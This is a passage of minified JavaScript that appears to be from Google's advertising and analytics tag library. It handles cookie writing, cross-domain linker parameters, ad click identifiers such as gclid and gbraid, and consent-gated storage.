              (g = a + "=" + b));
          var m,
            k = {};
          (g = e(g, "path", c.path)),
            c.expires instanceof Date
              ? (m = c.expires.toUTCString())
              : null != c.expires && (m = "" + c.expires),
            (g = e(g, "expires", m)),
            (g = e(g, "max-age", c.xm)),
            (g = e(g, "samesite", c.Tm)),
            c.Um && (g = f(g, "secure"));
          var n = c.domain;
          if (n && "auto" === n.toLowerCase()) {
            for (var p = wo(), q = void 0, r = !1, t = 0; t < p.length; ++t) {
              var u = "none" !== p[t] ? p[t] : void 0,
                v = e(g, "domain", u);
              v = f(v, c.flags);
              try {
                d && d(a, k);
              } catch (w) {
                q = w;
                continue;
              }
              if (((r = !0), !xo(u, c.path) && to(v, a, b, c.Cb))) return 0;
            }
            if (q && !r) throw q;
            return 1;
          }
          return (
            n && "none" !== n.toLowerCase() && (g = e(g, "domain", n)),
            (g = f(g, c.flags)),
            d && d(a, k),
            xo(n, c.path) ? 1 : to(g, a, b, c.Cb) ? 0 : 1
          );
        })(a, b, c)
      );
    }
    function so(a, b, c) {
      for (var f, d = [], e = [], g = 0; g < a.length; g++) {
        var k = a[g],
          m = b(k);
        m === c
          ? d.push(k)
          : void 0 === f || m < f
          ? ((e = [k]), (f = m))
          : m === f && e.push(k);
      }
      return d.length > 0 ? d : e;
    }
    var zo = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/,
      Ao = /(^|\.)doubleclick\.net$/i;
    function xo(a, b) {
      return (
        void 0 !== a &&
        (Ao.test(window.document.location.hostname) ||
          ("/" === b && zo.test(a)))
      );
    }
    function Bo(a) {
      if (!a) return 1;
      var b = a;
      return (
        nb(11) && "none" === a && (b = window.document.location.hostname),
        (b = 0 === b.indexOf(".") ? b.substring(1) : b).split(".").length
      );
    }
    function Co(a) {
      return a && "/" !== a
        ? ("/" !== a[0] && (a = "/" + a),
          "/" !== a[a.length - 1] && (a += "/"),
          a.split("/").length - 1)
        : 1;
    }
    function Do(a, b) {
      var c = "" + Bo(a),
        d = Co(b);
      return d > 1 && (c += "-" + d), c;
    }
    var Jo,
      po = function () {
        return mo(window) ? window.document.cookie : "";
      },
      oo = function (a) {
        return (
          !a ||
          !xk().j() ||
          (Array.isArray(a) ? a : [a]).every(function (b) {
            return Fk(b) && Ck(b);
          })
        );
      },
      wo = function () {
        var a = [],
          b = window.document.location.hostname.split(".");
        if (4 === b.length) {
          var c = b[b.length - 1];
          if (Number(c).toString() === c) return ["none"];
        }
        for (var d = b.length - 2; d >= 0; d--) a.push(b.slice(d).join("."));
        var e = window.document.location.hostname;
        return Ao.test(e) || zo.test(e) || a.push("none"), a;
      };
    function Eo(a) {
      var c,
        b = Math.round(2147483647 * Math.random());
      if (a) {
        var e,
          f,
          g,
          d = 1;
        if (a)
          for (d = 0, f = a.length - 1; f >= 0; f--)
            d =
              0 !==
              (e =
                266338304 &
                (d =
                  ((d << 6) & 268435455) + (g = a.charCodeAt(f)) + (g << 14)))
                ? d ^ (e >> 21)
                : d;
        c = String(b ^ (2147483647 & d));
      } else c = String(b);
      return c;
    }
    function Fo(a) {
      return [Eo(a), Math.round(Cb() / 1e3)].join(".");
    }
    function Go(a, b, c, d, e) {
      return qo(a, Bo(b), Co(c), d, e);
    }
    function Ho(a, b, c, d) {
      return [b, Do(c, d), a].join(".");
    }
    function Io(a, b, c, d) {
      var e,
        f = Number(null != a.Bb ? a.Bb : void 0);
      return (
        0 !== f && (e = new Date((b || Cb()) + 1e3 * (f || 7776e3))),
        {
          path: a.path,
          domain: a.domain,
          flags: a.flags,
          encode: !!c,
          expires: e,
          Cb: d,
        }
      );
    }
    function Ko() {
      function a(g) {
        c(g.target || g.srcElement || {});
      }
      var c = Lo,
        d = Mo,
        e = No();
      if (!e.init) {
        Ec(H, "mousedown", a),
          Ec(H, "keyup", a),
          Ec(H, "submit", function b(g) {
            d(g.target || g.srcElement || {});
          });
        var f = HTMLFormElement.prototype.submit;
        (HTMLFormElement.prototype.submit = function () {
          d(this), f.call(this);
        }),
          (e.init = !0);
      }
    }
    function Oo(a, b, c, d, e) {
      var f = {
        callback: a,
        domains: b,
        fragment: 2 === c,
        placement: c,
        forms: d,
        sameHost: e,
      };
      No().decorators.push(f);
    }
    function Po(a, b, c) {
      for (var d = No().decorators, e = {}, f = 0; f < d.length; ++f) {
        var k,
          g = d[f];
        if ((k = !c || g.forms))
          a: {
            var m = g.domains,
              n = a,
              p = !!g.sameHost;
            if (m && (p || n !== H.location.hostname))
              for (var q = 0; q < m.length; q++)
                if (m[q] instanceof RegExp) {
                  if (m[q].test(n)) {
                    k = !0;
                    break a;
                  }
                } else if (
                  n.indexOf(m[q]) >= 0 ||
                  (p && m[q].indexOf(n) >= 0)
                ) {
                  k = !0;
                  break a;
                }
            k = !1;
          }
        if (k) {
          var r = g.placement;
          void 0 === r && (r = g.fragment ? 2 : 1),
            r === b && Fb(e, g.callback());
        }
      }
      return e;
    }
    function No() {
      var a = uc("google_tag_data", {}),
        b = a.gl;
      return (b && b.decorators) || ((b = { decorators: [] }), (a.gl = b)), b;
    }
    var Qo = /(.*?)\*(.*?)\*(.*)/,
      Ro = /^https?:\/\/([^\/]*?)\.?cdn\.ampproject\.org\/?(.*)/,
      So = /^(?:www\.|m\.|amp\.)+/,
      To = /([^?#]+)(\?[^#]*)?(#.*)?/;
    function Uo(a) {
      var b = To.exec(a);
      if (b) return { Mh: b[1], query: b[2], fragment: b[3] };
    }
    function Vo(a, b) {
      var d,
        c = [
          qc.userAgent,
          new Date().getTimezoneOffset(),
          qc.userLanguage || qc.language,
          Math.floor(Cb() / 60 / 1e3) - (void 0 === b ? 0 : b),
          a,
        ].join("*");
      if (!(d = Jo)) {
        for (var e = Array(256), f = 0; f < 256; f++) {
          for (var g = f, k = 0; k < 8; k++)
            g = 1 & g ? (g >>> 1) ^ 3988292384 : g >>> 1;
          e[f] = g;
        }
        d = e;
      }
      Jo = d;
      for (var m = 4294967295, n = 0; n < c.length; n++)
        m = (m >>> 8) ^ Jo[255 & (m ^ c.charCodeAt(n))];
      return (~m >>> 0).toString(36);
    }
    function Yo(a) {
      var b = (function Wo() {
          return function (a) {
            var b = Yi(G.location.href),
              d = Ri(b.search.replace("?", ""), "_gl", !1, !0) || "";
            a.query = Xo(d) || {};
            var f,
              e = Si(b, "fragment"),
              g = -1;
            if (Hb(e, "_gl=")) g = 4;
            else {
              var k = e.indexOf("&_gl=");
              k > 0 && (g = k + 3 + 2);
            }
            if (g < 0) f = void 0;
            else {
              var m = e.indexOf("&", g);
              f = m < 0 ? e.substring(g) : e.substring(g, m);
            }
            a.fragment = Xo(f || "") || {};
          };
        })(),
        c = No();
      c.data || ((c.data = { query: {}, fragment: {} }), b(c.data));
      var d = {},
        e = c.data;
      return e && (Fb(d, e.query), a && Fb(d, e.fragment)), d;
    }
    var Xo = function (a) {
      try {
        var b = (function Zo(a, b) {
          if (a) {
            var c;
            a: {
              for (var d = a, e = 0; e < 3; ++e) {
                var f = Qo.exec(d);
                if (f) {
                  c = f;
                  break a;
                }
                d = decodeURIComponent(d);
              }
              c = void 0;
            }
            var g = c;
            if (g && "1" === g[1]) {
              var m,
                k = g[3];
              a: {
                for (var n = g[2], p = 0; p < b; ++p)
                  if (n === Vo(k, p)) {
                    m = !0;
                    break a;
                  }
                m = !1;
              }
              if (m) return k;
              ib("TAGGING", 7);
            }
          }
        })(a, 3);
        if (void 0 !== b) {
          for (
            var c = {}, d = b ? b.split("*") : [], e = 0;
            e + 1 < d.length;
            e += 2
          ) {
            var f = d[e],
              g = gb(d[e + 1]);
            c[f] = g;
          }
          return ib("TAGGING", 6), c;
        }
      } catch (k) {
        ib("TAGGING", 8);
      }
    };
    function $o(a, b, c, d, e) {
      function f(p) {
        var q = p,
          r = new RegExp("(.*?)(^|&)" + a + "=([^&]*)&?(.*)").exec(q),
          t = q;
        if (r) {
          var u = r[2],
            v = r[4];
          (t = r[1]), v && (t = t + u + v);
        }
        var w = (p = t).charAt(p.length - 1);
        return p && "&" !== w && (p += "&"), p + n;
      }
      (d = void 0 !== d && d), (e = void 0 !== e && e);
      var g = Uo(c);
      if (!g) return "";
      var k = g.query || "",
        m = g.fragment || "",
        n = a + "=" + b;
      return (
        d
          ? (0 !== m.substring(1).length && e) || (m = "#" + f(m.substring(1)))
          : (k = "?" + f(k.substring(1))),
        "" + g.Mh + k + m
      );
    }
    function ap(a, b) {
      function c(n, p, q) {
        var r;
        a: {
          for (var t in n)
            if (n.hasOwnProperty(t)) {
              r = !0;
              break a;
            }
          r = !1;
        }
        if (r) {
          var u,
            w,
            v = [];
          for (w in n)
            if (n.hasOwnProperty(w)) {
              var x = n[w];
              void 0 !== x &&
                x == x &&
                null !== x &&
                "[object Object]" !== x.toString() &&
                (v.push(w), v.push(fb(String(x))));
            }
          var y = v.join("*");
          (u = ["1", Vo(y), y].join("*")),
            d
              ? (nb(4) || nb(1) || !p) && bp("_gl", u, a, p, q)
              : cp("_gl", u, a, p, q);
        }
      }
      var d = "FORM" === (a.tagName || "").toUpperCase(),
        e = Po(b, 1, d),
        f = Po(b, 2, d),
        g = Po(b, 4, d),
        k = Po(b, 3, d);
      for (var m in (c(e, !1, !1), c(f, !0, !1), nb(1) && c(g, !0, !0), k))
        k.hasOwnProperty(m) && dp(m, k[m], a);
    }
    function dp(a, b, c) {
      "a" === c.tagName.toLowerCase()
        ? cp(a, b, c)
        : "form" === c.tagName.toLowerCase() && bp(a, b, c);
    }
    function cp(a, b, c, d, e) {
      var f;
      if (((d = void 0 !== d && d), (e = void 0 !== e && e), (f = c.href))) {
        var g;
        if (!(g = !nb(5) || d)) {
          var k = G.location.href,
            m = Uo(c.href),
            n = Uo(k);
          g = !(m && n && m.Mh === n.Mh && m.query === n.query && m.fragment);
        }
        f = g;
      }
      if (f) {
        var p = $o(a, b, c.href, d, e);
        gc.test(p) && (c.href = p);
      }
    }
    function bp(a, b, c, d, e) {
      if (((d = void 0 !== d && d), (e = void 0 !== e && e), c && c.action)) {
        var f = (c.method || "").toLowerCase();
        if ("get" !== f || d) {
          if ("get" === f || "post" === f) {
            var g = $o(a, b, c.action, d, e);
            gc.test(g) && (c.action = g);
          }
        } else {
          for (var k = c.childNodes || [], m = !1, n = 0; n < k.length; n++) {
            var p = k[n];
            if (p.name === a) {
              p.setAttribute("value", b), (m = !0);
              break;
            }
          }
          if (!m) {
            var q = H.createElement("input");
            q.setAttribute("type", "hidden"),
              q.setAttribute("name", a),
              q.setAttribute("value", b),
              c.appendChild(q);
          }
        }
      }
    }
    function Lo(a) {
      try {
        var b;
        a: {
          for (var c = a, d = 100; c && d > 0; ) {
            if (c.href && c.nodeName.match(/^a(?:rea)?$/i)) {
              b = c;
              break a;
            }
            (c = c.parentNode), d--;
          }
          b = null;
        }
        var e = b;
        if (e) {
          var f = e.protocol;
          ("http:" !== f && "https:" !== f) || ap(e, e.hostname);
        }
      } catch (g) {}
    }
    function Mo(a) {
      try {
        if (a.action) ap(a, Si(Yi(a.action), "host"));
      } catch (c) {}
    }
    function ep(a, b, c, d) {
      Ko();
      var e = "fragment" === c ? 2 : 1;
      Oo(a, b, e, (d = !!d), !1),
        2 === e && ib("TAGGING", 23),
        d && ib("TAGGING", 24);
    }
    function fp(a, b) {
      Ko(), Oo(a, [Ui(G.location, "host", !0)], b, !0, !0);
    }
    function gp() {
      var a = H.location.hostname,
        b = Ro.exec(H.referrer);
      if (!b) return !1;
      var c = b[2],
        d = b[1],
        e = "";
      if (c) {
        var f = c.split("/"),
          g = f[1];
        e = "s" === g ? decodeURIComponent(f[2]) : decodeURIComponent(g);
      } else if (d) {
        if (0 === d.indexOf("xn--")) return !1;
        e = d.replace(/-/g, ".").replace(/\.\./g, "-");
      }
      var k = a.replace(So, ""),
        m = e.replace(So, "");
      return (
        k === m ||
        (function Ib(a, b) {
          return (
            a.length >= b.length &&
            a.substring(a.length - b.length, a.length) === b
          );
        })(k, "." + m)
      );
    }
    var ip = ["1"],
      jp = {},
      kp = {};
    function lp(a, b) {
      b = void 0 === b || b;
      var c = mp(a.prefix);
      if (!jp[c])
        if (np(c, a.path, a.domain)) {
          var d = kp[mp(a.prefix)];
          op(a, d ? d.id : void 0, d ? d.Gh : void 0);
        } else {
          var e = $i("auiddc");
          if (e) ib("TAGGING", 17), (jp[c] = e);
          else if (b) {
            pp(mp(a.prefix), Fo(), a), np(c, a.path, a.domain);
          }
        }
    }
    function op(a, b, c) {
      var d = mp(a.prefix),
        e = jp[d];
      if (e) {
        var f = e.split(".");
        if (2 === f.length) {
          var g = Number(f[1]) || 0;
          if (g) {
            var k = e;
            b && (k = e + "." + b + "." + (c || Math.floor(Cb() / 1e3))),
              pp(d, k, a, 1e3 * g);
          }
        }
      }
    }
    function pp(a, b, c, d) {
      var e = Ho(b, "1", c.domain, c.path),
        f = Io(c, d);
      (f.Cb = ["ad_storage", "ad_user_data"]), yo(a, e, f);
    }
    function np(a, b, c) {
      var d = Go(a, b, c, ip, ["ad_storage", "ad_user_data"]);
      return !!d && (rp(a, d), !0);
    }
    function rp(a, b) {
      var c = b.split(".");
      5 === c.length
        ? ((jp[a] = c.slice(0, 2).join(".")),
          (kp[a] = { id: c.slice(2, 4).join("."), Gh: Number(c[4]) || 0 }))
        : 3 === c.length
        ? (kp[a] = { id: c.slice(0, 2).join("."), Gh: Number(c[2]) || 0 })
        : (jp[a] = b);
    }
    function mp(a) {
      return (a || "_gcl") + "_au";
    }
    function sp(a) {
      function b() {
        Ck(c) && a();
      }
      var c = ["ad_storage", "ad_user_data"];
      Jk(function () {
        b(), Ck(c) || Kk(b, c);
      }, c);
    }
    function tp(a) {
      var b = Yo(!0),
        c = mp(a.prefix);
      sp(function () {
        var d = b[c];
        if (d) {
          rp(c, d);
          var e = 1e3 * Number(jp[c].split(".")[1]);
          if (e) {
            ib("TAGGING", 16);
            var f = Io(a, e);
            f.Cb = ["ad_storage", "ad_user_data"];
            var g = Ho(d, "1", a.domain, a.path);
            yo(c, g, f);
          }
        }
      });
    }
    function up(a, b, c, d, e) {
      e = e || {};
      var f = function () {
        var g = {},
          k = Go(a, e.path, e.domain, ip, ["ad_storage", "ad_user_data"]);
        return k && (g[a] = k), g;
      };
      sp(function () {
        ep(f, b, c, d);
      });
    }
    function wp(a, b) {
      var c = (function vp(a) {
          for (
            var b = [],
              c = H.cookie.split(";"),
              d = new RegExp(
                "^\\s*" + (a || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$"
              ),
              e = 0;
            e < c.length;
            e++
          ) {
            var f = c[e].match(d);
            f &&
              b.push({
                ai: f[1],
                value: f[2],
                timestamp: Number(f[2].split(".")[1]) || 0,
              });
          }
          return (
            b.sort(function (g, k) {
              return k.timestamp - g.timestamp;
            }),
            b
          );
        })(a),
        d = {};
      if (!c || !c.length) return d;
      for (var e = 0; e < c.length; e++) {
        var f = c[e].value.split(".");
        if (
          !("1" !== f[0] || (b && f.length < 3) || (!b && 3 !== f.length)) &&
          Number(f[1])
        ) {
          d[c[e].ai] || (d[c[e].ai] = []);
          var g = { version: f[0], timestamp: 1e3 * Number(f[1]), aa: f[2] };
          b && f.length > 3 && (g.labels = f.slice(3)), d[c[e].ai].push(g);
        }
      }
      return d;
    }
    var xp = {},
      yp =
        ((xp.k = { Ma: /^[\w-]+$/ }),
        (xp.b = { Ma: /^[\w-]+$/, Th: !0 }),
        (xp.i = { Ma: /^[1-9]\d*$/ }),
        xp),
      zp = {},
      Cp =
        ((zp[5] = { wk: { 2: Ap }, gh: ["k", "i", "b"] }),
        (zp[4] = {
          wk: {
            2: Ap,
            GCL: function Bp(a) {
              var b = a.split(".");
              b.shift();
              var c = b.shift(),
                d = b.shift(),
                e = {};
              return (e.k = d), (e.i = c), (e.b = b), e;
            },
          },
          gh: ["k", "i", "b"],
        }),
        zp);
    function Dp(a) {
      var b = Cp[5];
      if (b) {
        var c = a.split(".")[0];
        if (c) {
          var d = b.wk[c];
          if (d) return d(a, 5);
        }
      }
    }
    function Ap(a, b) {
      var c = a.split(".");
      if (3 === c.length) {
        var d = {},
          e = Cp[b];
        if (e) {
          for (
            var f = e.gh, g = ma(c[2].split("$")), k = g.next();
            !k.done;
            k = g.next()
          ) {
            var m = k.value,
              n = m[0];
            if (-1 !== f.indexOf(n))
              try {
                var p = decodeURIComponent(m.substring(1)),
                  q = yp[n];
                q && (q.Th ? ((d[n] = d[n] || []), d[n].push(p)) : (d[n] = p));
              } catch (r) {}
          }
          return d;
        }
      }
    }
    function Ep(a, b) {
      var c = Cp[5];
      if (c) {
        for (var d = [], e = ma(c.gh), f = e.next(); !f.done; f = e.next()) {
          var g = f.value,
            k = yp[g];
          if (k) {
            var m = a[g];
            if (void 0 !== m)
              if (k.Th && Array.isArray(m))
                for (var n = ma(m), p = n.next(); !p.done; p = n.next())
                  d.push(encodeURIComponent("" + g + p.value));
              else d.push(encodeURIComponent("" + g + m));
          }
        }
        return ["2", b || "1", d.join("$")].join(".");
      }
    }
    var Fp = new Map([
      [5, "ad_storage"],
      [4, ["ad_storage", "ad_user_data"]],
    ]);
    function Gp(a) {
      if (Cp[5]) {
        for (
          var b = [],
            c = no(a, void 0, void 0, Fp.get(5)),
            d = ma(c),
            e = d.next();
          !e.done;
          e = d.next()
        ) {
          var f = Dp(e.value);
          f && (Hp(f), b.push(f));
        }
        return b;
      }
    }
    function Ip(a, b, c, d) {
      var f = Ep(b, Do((c = c || {}).domain, c.path));
      f && yo(a, f, Io(c, d, void 0, Fp.get(5)));
    }
    function Jp(a, b) {
      var c = b.Ma;
      return "function" == typeof c ? c(a) : c.test(a);
    }
    function Hp(a) {
      for (
        var b = ma(Object.keys(a)), c = b.next(), d = {};
        !c.done;
        d = { Be: void 0 }, c = b.next()
      ) {
        var e = c.value,
          f = a[e];
        (d.Be = yp[e]),
          d.Be
            ? d.Be.Th
              ? (a[e] = Array.isArray(f)
                  ? f.filter(
                      (function (g) {
                        return function (k) {
                          return Jp(k, g.Be);
                        };
                      })(d)
                    )
                  : void 0)
              : ("string" == typeof f && Jp(f, d.Be)) || (a[e] = void 0)
            : (a[e] = void 0);
      }
    }
    var Kp = /^\w+$/,
      Lp = /^[\w-]+$/,
      Mp = {},
      Np =
        ((Mp.aw = "_aw"),
        (Mp.dc = "_dc"),
        (Mp.gf = "_gf"),
        (Mp.gp = "_gp"),
        (Mp.gs = "_gs"),
        (Mp.ha = "_ha"),
        (Mp.ag = "_ag"),
        (Mp.gb = "_gb"),
        Mp);
    function Pp(a) {
      return !xk().j() || Ck(a);
    }
    function Qp(a, b) {
      function c() {
        var d = Pp(b);
        return d && a(), d;
      }
      Jk(function () {
        c() || Kk(c, b);
      }, b);
    }
    function Rp(a) {
      return Sp(a).map(function (b) {
        return b.aa;
      });
    }
    function Up(a) {
      var b = Vp(a.prefix),
        c = Wp("gb", b),
        d = Wp("ag", b);
      if (!d || !c) return [];
      var e = function (k) {
          return function (m) {
            return (m.type = k), m;
          };
        },
        f = Sp(c).map(e("gb")),
        g = (nb(7) ? Xp(d) : []).map(e("ag"));
      return f.concat(g).sort(function (k, m) {
        return m.timestamp - k.timestamp;
      });
    }
    function Yp(a, b, c, d, e) {
      var f = sb(a, function (g) {
        return g.aa === c;
      });
      f
        ? ((f.timestamp = Math.max(f.timestamp, d)),
          (f.labels = (function Zp(a, b) {
            if (!a.length) return b;
            if (!b.length) return a;
            var c = {};
            return a.concat(b).filter(function (d) {
              return !c.hasOwnProperty(d) && (c[d] = !0);
            });
          })(f.labels || [], e || [])))
        : a.push({ version: b, aa: c, timestamp: d, labels: e });
    }
    function Xp(a) {
      for (
        var b = Gp(a) || [], c = [], d = ma(b), e = d.next();
        !e.done;
        e = d.next()
      ) {
        var f = e.value,
          g = f,
          k = $p(f);
        k && Yp(c, "2", g.k, k, g.b || []);
      }
      return c.sort(function (m, n) {
        return n.timestamp - m.timestamp;
      });
    }
    function Sp(a) {
      for (
        var b = [],
          c = no(a, H.cookie, void 0, ["ad_storage", "ad_user_data"]),
          d = ma(c),
          e = d.next();
        !e.done;
        e = d.next()
      ) {
        var f = aq(e.value);
        if (null != f) {
          var g = f;
          Yp(b, g.version, g.aa, g.timestamp, g.labels);
        }
      }
      return (
        b.sort(function (k, m) {
          return m.timestamp - k.timestamp;
        }),
        bq(b)
      );
    }
    function Vp(a) {
      return a && "string" == typeof a && a.match(Kp) ? a : "_gcl";
    }
    function cq(a, b) {
      var k,
        c = nb(7),
        d = Yi(a),
        e = Si(d, "query", !1, void 0, "gclid"),
        f = Si(d, "query", !1, void 0, "gclsrc"),
        g = Si(d, "query", !1, void 0, "wbraid");
      (g = (function Ob(a) {
        if (!a) return a;
        var b = a;
        if (nb(3))
          try {
            b = decodeURIComponent(a);
          } catch (d) {}
        var c = b.split(",");
        return 2 === c.length && c[0] === c[1] ? c[0] : a;
      })(g)),
        c && (k = Si(d, "query", !1, void 0, "gbraid"));
      var m = Si(d, "query", !1, void 0, "gad_source"),
        n = Si(d, "query", !1, void 0, "dclid");
      if (b && (!e || !f || !g || (c && !k))) {
        var p = d.hash.replace("#", "");
        (e = e || Ri(p, "gclid", !1)),
          (f = f || Ri(p, "gclsrc", !1)),
          (g = g || Ri(p, "wbraid", !1)),
          c && (k = k || Ri(p, "gbraid", !1)),
          (m = m || Ri(p, "gad_source", !1));
      }
      return dq(e, f, n, g, k, m);
    }
    function eq() {
      return cq(G.location.href, !0);
    }
    function dq(a, b, c, d, e, f) {
      var g = {},
        k = function (m, n) {
          g[n] || (g[n] = []), g[n].push(m);
        };
      if (
        ((g.gclid = a),
        (g.gclsrc = b),
        (g.dclid = c),
        void 0 !== a && a.match(Lp))
      )
        switch (b) {
          case void 0:
            k(a, "aw");
            break;
          case "aw.ds":
            k(a, "aw"), k(a, "dc");
            break;
          case "ds":
          case "3p.ds":
            k(a, "dc");
            break;
          case "gf":
            k(a, "gf");
            break;
          case "ha":
            k(a, "ha");
        }
      return (
        c && k(c, "dc"),
        void 0 !== d && Lp.test(d) && ((g.wbraid = d), k(d, "gb")),
        nb(7) && void 0 !== e && Lp.test(e) && ((g.gbraid = e), k(e, "ag")),
        void 0 !== f && Lp.test(f) && ((g.gad_source = f), k(f, "gs")),
        g
      );
    }
    function fq(a) {
      var b = eq();
      if (nb(6)) {
        for (
          var c = !0, d = ma(Object.keys(b)), e = d.next();
          !e.done;
          e = d.next()
        )
          if (void 0 !== b[e.value]) {
            c = !1;
            break;
          }
        c && (b = cq(G.document.referrer, !1));
      }
      gq(b, !1, a);
    }
    function gq(a, b, c, d, e) {
      e = e || [];
      var f = Vp((c = c || {}).prefix),
        g = d || Cb(),
        k = Math.round(g / 1e3),
        m = ["ad_storage", "ad_user_data"],
        n = !1,
        p = !1,
        q = function () {
          if (Pp(m)) {
            var r = Io(c, g, !0);
            r.Cb = m;
            for (
              var t = function (F, L) {
                  var M = Wp(F, f);
                  M && (yo(M, L, r), "gb" !== F && (n = !0));
                },
                u = function (F) {
                  var L = ["GCL", k, F];
                  return e.length > 0 && L.push(e.join(".")), L.join(".");
                },
                v = ma(["aw", "dc", "gf", "ha", "gp"]),
                w = v.next();
              !w.done;
              w = v.next()
            ) {
              var x = w.value;
              a[x] && t(x, u(a[x][0]));
            }
            if (!n && a.gb) {
              var y = a.gb[0],
                B = Wp("gb", f);
              (!b &&
                Sp(B).some(function (F) {
                  return F.aa === y && F.labels && F.labels.length > 0;
                })) ||
                t("gb", u(y));
            }
          }
          if (!p && nb(7) && a.gbraid && Pp("ad_storage") && ((p = !0), !n)) {
            var A = a.gbraid,
              C = Wp("ag", f);
            if (
              b ||
              !(nb(7) ? Xp(C) : []).some(function (F) {
                return F.aa === A && F.labels && F.labels.length > 0;
              })
            ) {
              var E = {};
              Ip(C, ((E.k = A), (E.i = "" + k), (E.b = e), E), c, g);
            }
          }
          !(function hq(a, b, c, d) {
            if (void 0 !== a.gad_source && Pp("ad_storage")) {
              var e = Wp("gs", b);
              if (e) {
                var f = Math.round((Cb() - (Qc() || 0)) / 1e3),
                  g = {};
                Ip(e, ((g.k = a.gad_source), (g.i = "" + f), g), d, c);
              }
            }
          })(a, f, g, c);
        };
      Jk(function () {
        q(), Pp(m) || Kk(q, m);
      }, m);
    }
    function iq(a, b) {
      var c = Yo(!0);
      Qp(
        function () {
          for (var d = Vp(b.prefix), e = 0; e < a.length; ++e) {
            var f = a[e];
            if (void 0 !== Np[f]) {
              var g = Wp(f, d),
                k = c[g];
              if (k) {
                var n,
                  m = Math.min(jq(k), Cb());
                b: {
                  for (
                    var p = m,
                      q = no(g, H.cookie, void 0, [
                        "ad_storage",
                        "ad_user_data",
                      ]),
                      r = 0;
                    r < q.length;
                    ++r
                  )
                    if (jq(q[r]) > p) {
                      n = !0;
                      break b;
                    }
                  n = !1;
                }
                if (!n) {
                  var t = Io(b, m, !0);
                  (t.Cb = ["ad_storage", "ad_user_data"]), yo(g, k, t);
                }
              }
            }
          }
          gq(dq(c.gclid, c.gclsrc), !1, b);
        },
        ["ad_storage", "ad_user_data"]
      );
    }
    function Wp(a, b) {
      var c = Np[a];
      if (void 0 !== c) return b + c;
    }
    function jq(a) {
      return 0 !== lq(a.split(".")).length
        ? 1e3 * (Number(a.split(".")[1]) || 0)
        : 0;
    }
    function $p(a) {
      return a ? 1e3 * (Number(a.i) || 0) : 0;
    }
    function aq(a) {
      var b = lq(a.split("."));
      return 0 === b.length
        ? null
        : {
            version: b[0],
            aa: b[2],
            timestamp: 1e3 * (Number(b[1]) || 0),
            labels: b.slice(3),
          };
    }
    function lq(a) {
      return a.length < 3 ||
        ("GCL" !== a[0] && "1" !== a[0]) ||
        !/^\d+$/.test(a[1]) ||
        !Lp.test(a[2])
        ? []
        : a;
    }
    function mq(a, b, c, d, e) {
      if (Array.isArray(b) && mo(G)) {
        var f = Vp(e),
          g = function () {
            for (var k = {}, m = 0; m < a.length; ++m) {
              var n = Wp(a[m], f);
              if (n) {
                var p = no(n, H.cookie, void 0, ["ad_storage", "ad_user_data"]);
                p.length && (k[n] = p.sort()[p.length - 1]);
              }
            }
            return k;
          };
        Qp(
          function () {
            ep(g, b, c, d);
          },
          ["ad_storage", "ad_user_data"]
        );
      }
    }
    function bq(a) {
      return a.filter(function (b) {
        return Lp.test(b.aa);
      });
    }
    function oq(a, b) {
      if (mo(G)) {
        for (var c = Vp(b.prefix), d = {}, e = 0; e < a.length; e++)
          Np[a[e]] && (d[a[e]] = Np[a[e]]);
        Qp(
          function () {
            z(d, function (f, g) {
              var k = no(c + g, H.cookie, void 0, [
                "ad_storage",
                "ad_user_data",
              ]);
              if (
                (k.sort(function (t, u) {
                  return jq(u) - jq(t);
                }),
                k.length)
              ) {
                var r,
                  m = k[0],
                  n = jq(m),
                  p =
                    0 !== lq(m.split(".")).length ? m.split(".").slice(3) : [],
                  q = {};
                (r = 0 !== lq(m.split(".")).length ? m.split(".")[2] : void 0),
                  (q[f] = [r]),
                  gq(q, !0, b, n, p);
              }
            });
          },
          ["ad_storage", "ad_user_data"]
        );
      }
    }
    function qq(a, b) {
      for (var c = 0; c < b.length; ++c) if (a[b[c]]) return !0;
      return !1;
    }
    function rq(a) {
      function b(e, f, g) {
        g && (e[f] = g);
      }
      if (Gk()) {
        var c = eq();
        if (qq(c, a)) {
          var d = {};
          b(d, "gclid", c.gclid),
            b(d, "dclid", c.dclid),
            b(d, "gclsrc", c.gclsrc),
            b(d, "wbraid", c.wbraid),
            nb(7) && b(d, "gbraid", c.gbraid),
            fp(function () {
              return d;
            }, 3),
            fp(function () {
              var e = { _up: "1" };
              return e;
            }, 1);
        }
      }
    }
    function sq(a) {
      if (!nb(1)) return null;
      var b = Yo(!0).gad_source;
      if (null != b) return (G.location.hash = ""), b;
      if (nb(2)) {
        if (
          null !=
          (b = Si(Yi(G.location.href), "query", !1, void 0, "gad_source"))
        )
          return b;
        if (qq(eq(), a)) return "0";
      }
      return null;
    }
    function tq(a) {
      var b = sq(a);
      null != b &&
        fp(function () {
          var c = {};
          return (c.gad_source = b), c;
        }, 4);
    }
    function uq(a, b, c) {
      var d = [];
      if (0 === b.length) return d;
      for (var e = {}, f = 0; f < b.length; f++) {
        var g = b[f],
          k = g.type ? g.type : "gcl";
        -1 === (g.labels || []).indexOf(c)
          ? (a.push(0), e[k] || d.push(g))
          : a.push(1),
          (e[k] = !0);
      }
      return d;
    }
    function vq(a, b, c, d) {
      var e = [];
      if (((c = c || {}), !Pp(["ad_storage", "ad_user_data"]))) return e;
      var g = uq(e, Sp(a), b);
      if (g.length && !d)
        for (var k = ma(g), m = k.next(); !m.done; m = k.next()) {
          var n = m.value,
            p = n.timestamp,
            q = [n.version, Math.round(p / 1e3), n.aa]
              .concat(n.labels || [], [b])
              .join("."),
            r = Io(c, p, !0);
          (r.Cb = ["ad_storage", "ad_user_data"]), yo(a, q, r);
        }
      return e;
    }
    function xq(a, b) {
      var e,
        d = Wp(a, Vp(b));
      if (!d) return 0;
      e = "ag" === a ? (nb(7) ? Xp(d) : []) : Sp(d);
      for (var f = 0, g = 0; g < e.length; g++) f = Math.max(f, e[g].timestamp);
      return f;
    }
    function yq(a) {
      for (
        var b = 0, c = ma(Object.keys(a)), d = c.next();
        !d.done;
        d = c.next()
      )
        for (var e = a[d.value], f = 0; f < e.length; f++)
          b = Math.max(b, Number(e[f].timestamp));
      return b;
    }
    var Aq = function (a, b, c) {
        var d = (hi.joined_auid = hi.joined_auid || {}),
          e = (c ? a || "_gcl" : "") + "." + b;
        return !!d[e] || ((d[e] = !0), !1);
      },
      Bq = function () {
        var a = Yi(G.location.href),
          b = void 0,
          c = void 0,
          d = Si(a, "query", !1, void 0, "gad_source"),
          f = Ri(a.hash.replace("#", ""), "gad_source", !1);
        return (
          d && f
            ? ((b = d), (c = 1))
